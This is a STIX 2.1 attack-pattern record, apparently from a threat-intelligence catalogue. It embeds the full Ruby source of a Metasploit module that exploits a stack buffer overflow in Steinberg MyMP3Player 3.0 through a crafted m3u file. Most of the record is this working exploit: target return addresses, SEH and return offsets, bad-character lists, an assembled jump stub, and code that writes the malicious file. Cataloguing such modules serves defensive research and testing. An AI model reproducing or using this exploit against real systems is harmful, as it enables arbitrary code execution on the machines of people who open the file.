{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4cd33b8c-c235-4845-96fc-e84b86e64250",
    "created": "2024-08-14T16:36:56.01805Z",
    "modified": "2024-08-14T16:36:56.018054Z",
    "name": "Steinberg MyMP3Player 3.0 Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Steinberg MyMP3Player == 3.0. When the application is used to open a specially crafted m3u file, a buffer overflow occurs allowing arbitrary code execution.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/mymp3player_m3u.rb",
            "external_id": "mymp3player_m3u.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Steinberg MyMP3Player 3.0 Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Steinberg MyMP3Player == 3.0. When\n        the application is used to open a specially crafted m3u file, a buffer overflow occurs\n        allowing arbitrary code execution.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'n3w7u', # original\n          'm_101'\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '64580'],\n          [ 'EDB', '11791' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 900,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x5c\",\n          'DisableNops'  => true,\n          'PrependEncoder' => \"\\x81\\xc4\\xf0\\xef\\xff\\xff\"\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows Universal', { 'Ret' => 0x0043bea3 } ],        # call ecx in My MP3.exe v3.0.0.67\n          [ 'Windows Universal (SEH)', { 'Ret' => 0x00403e68 } ],  # p/p/r in My MP3.exe v3.0.0.67\n          [ 'Windows XP SP3 French', { 'Ret' => 0x72c6170b } ], # seh return in msacm.drv\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-03-18',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ false, 'The file name.', 'msf.m3u']),\n      ])\n\n  end\n\n  def exploit\n\n    # direct ret overwrite at offset 1024\n    # nseh overwrite at offset 1040\n    ret_offset = 1024\n    seh_offset = 1040\n\n    # start with the payload\n    m3u = payload.encoded\n\n    if (target.name =~ /SEH/)\n      m3u << rand_text_alphanumeric(seh_offset - m3u.length)\n      # ensure bad,no-nul addr for ret (trigger SEH)\n      m3u[ret_offset,4] = [0xc0010101 | rand(0xffffffff)].pack('V')\n\n      # We utilize a small stub near the end of the buffer space to\n      # continue to the real shellcode...\n      # NOTE: the push is to avoid a badchar (0x5c)\n      stub = <<-EOF\npush ecx\nsub esp,-0x1a8\nret\nEOF\n      stub = Metasm::Shellcode.assemble(Metasm::Ia32.new, stub).encode_string\n      m3u[seh_offset - stub.length, stub.length] = stub\n\n      # Jump back to the stub\n      jmp2 = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + stub.length.to_s).encode_string\n      seh = ''\n      seh << jmp2\n      seh << rand_text(2)\n      seh << [target.ret].pack('V')\n      m3u << seh\n    else\n      m3u << rand_text_alphanumeric(1024 - m3u.length)\n      m3u << [target.ret].pack('V')\n    end\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(m3u)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-03-18",
    "x_mitre_platforms": [
        "win'"
    ]
}